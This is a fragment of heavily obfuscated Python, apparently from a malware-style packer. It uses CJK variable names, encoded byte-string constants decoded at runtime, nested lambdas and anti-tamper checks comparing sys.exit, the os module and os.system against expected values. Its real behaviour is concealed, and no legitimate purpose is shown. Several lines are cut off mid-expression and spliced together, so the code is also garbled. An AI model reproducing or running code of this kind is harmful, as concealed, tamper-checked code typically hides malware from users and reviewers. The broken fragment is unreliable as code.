                眞鱓灐觶籘鷛 = [[(lambda: (lambda 蕊毿蹿鷁旈丗: 蕊毿蹿鷁旈丗 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 陱馿鸬唏籆啓: 陱馿鸬唏籆啓 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [3333333333333333333333333333333333333333333333333333333333242422222222222222222722249364, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722255108, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722249416, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722248096, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722261861, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722249886]))))())())()])
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隹皫妢蜲咭莺:
        if str(__import__('sys').exit) != (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd5'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfb'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xff'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x11'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd7'))()]))))())())():
            [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '豛檼拁麣栒摣' == '抢氧妟颯嬅走':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            廷龄雔加秙弜 = [[True], [False]]
            暽掇財豥硿淳(['穣鮔忣岍医鐰'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 淍梬霣哂靊卌:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                悓娍銉囵藼喱 = [[(lambda: (lambda 馭肹敁岢莧緽: 馭肹敁岢莧緽 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 玕跀釧涫茮瓥: 玕跀釧涫茮瓥 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 裲頓铽伌蔢嵆:
        if str(__import__('os')) != ("<module 'os' (frozen)>"):
            [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '鰠瀻鎲譽佪骹' == '荮蜃犩螯虘傡':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            糮饟臘镕慝喯 = [[True], [False]]
            暽掇財豥硿淳(['挫挷鑳蕤陊刃'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 營北搨焫嬕鑵:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                软仫镴梯濢呎 = [[(lambda: (lambda 狣怄側鍨膰眢: 狣怄側鍨膰眢 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 芞畞晒鑦浊呿: 芞畞晒鑦浊呿 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [3333333333333333333333333333333333333333333333333333333333242422222222222222222722258594, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722259952, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722258589, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722247103, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722254771, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722247501]))))())())()])
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 缋袺课肒阩翨:
        if str(__import__('os').system) != (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd5'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfb'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xff'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd7'))()]))))())())():
            [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 